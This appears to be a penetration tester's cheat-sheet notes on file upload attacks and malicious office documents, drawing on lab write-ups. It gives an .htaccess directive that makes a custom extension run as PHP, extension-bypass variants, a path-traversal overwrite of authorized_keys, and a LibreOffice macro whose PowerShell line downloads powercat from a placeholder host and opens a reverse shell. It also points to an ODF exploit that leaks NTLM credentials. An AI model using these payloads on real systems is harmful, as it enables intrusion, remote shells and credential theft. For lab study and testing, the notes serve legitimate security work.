#### HTACCESS BYPASS

```
#Upload a custom .htaccess file. (https://br4ind3ad.medium.com/port-swigger-file-upload-vulnerability-lab-4-4c2bf39eeaf)
#This means all files with the extension evil with execute as PHP.
AddType application/x-httpd-php .evil
```

### Extension 

```
#Modify the original extension
eg. phps, pHp, php7, phtml.
```


### Over Writing
![[Pasted image 20231205204847.png]]

The response shows the ../../ indicating we may be able to overwrite files.

Create a SSH key and authroized_keys file.

![[Pasted image 20231205205001.png]]

Select your file and edit the path to overwrite a folder.

![[Pasted image 20231205205011.png]]


### ODT

```
Reference: https://al1z4deh.medium.com/proving-grounds-craft-c92de878e004 OR https://documentation.libreoffice.org/assets/Uploads/Documentation/en/GS5.1/HTML/GS5113-GettingStartedWithMacros.html#__RefHeading__5150_1196992793

#Steps In LibreOffice
1. Create new document.
2. Add macro: Tools -> Macros -> Organise Macros -> Basic
3. Edit new Macro.

REM  ***** BASIC *****

Sub Main
	Shell("cmd /c powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<ip>/powercat.ps1'); powercat -c <ip> -p <port> -e powershell"")
End Sub

4. Might pay to just do a curl first to test the code execution is working.

```


```
#Generates ODF file which can be used to leak NTLM credentials.
https://www.exploit-db.com/exploits/44564
```